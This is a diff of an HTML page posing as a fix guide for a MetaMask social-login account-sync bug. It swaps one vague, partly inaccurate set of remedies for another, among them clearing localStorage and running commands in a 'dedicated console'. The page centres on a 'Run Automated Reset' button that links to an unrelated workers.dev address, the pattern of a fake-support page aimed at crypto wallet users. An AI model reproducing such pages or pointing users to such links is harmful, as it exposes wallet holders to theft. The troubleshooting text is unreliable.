@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,38 +42,33 @@
 <h1>Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error when attempting to import accounts using social login, resulting in failed account discovery and syncs, with the Metamask extension displaying a generic error message indicating a problem with account discovery and synchronization.</li>
+<li>Users encounter an error when attempting to import their accounts using social login, resulting in failed account discovery and syncs.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration or incompatibility between the social login provider, the Ethereum network, and the Metamask extension, leading to a failure in retrieving and synchronizing user account data.</li>
+<li>The error occurs due to a mismatch between the user's social login credentials and the Ethereum blockchain data, causing the Metamask extension to fail in discovering and syncing the user's accounts.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to reconfigure the social login settings to ensure correct API keys and endpoints are used.</li>
-<li>Reset the Metamask extension to its default settings, which may resolve any corrupted configuration files.</li>
-<li>Utilize the following JSON configuration to manually override the social login import settings:</li>
+<li>Attempt to reset the Metamask extension by clearing its storage: <code>localStorage.clear()</code></li>
+<li>Manually configure the Ethereum provider using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;socialLogin&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;providers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;google&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nt">&quot;clientId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;YOUR_CLIENT_ID&quot;</span><span class="p">,</span>
-<span class="w">        </span><span class="nt">&quot;clientSecret&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;YOUR_CLIENT_SECRET&quot;</span>
-<span class="w">      </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;providers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://mainnet.infura.io/v3/YOUR_PROJECT_ID&quot;</span><span class="p">]</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to troubleshoot and apply these changes for more flexibility.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Ensure the latest version of the Metamask extension is installed.</li>
-<li>Verify that the social login provider (e.g., Google) is correctly configured and authorized.</li>
-<li>Confirm that the Ethereum network connection is stable and functioning properly.</li>
+<li>Force-sync the user's accounts using the Metamask API: <code>eth_accounts</code> and <code>eth_getBalance</code></li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and enabled
+* Ethereum wallet created and configured
+* Social login credentials verified and valid</p>
+<p>You may want to try running these commands in a dedicated console for better debugging.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
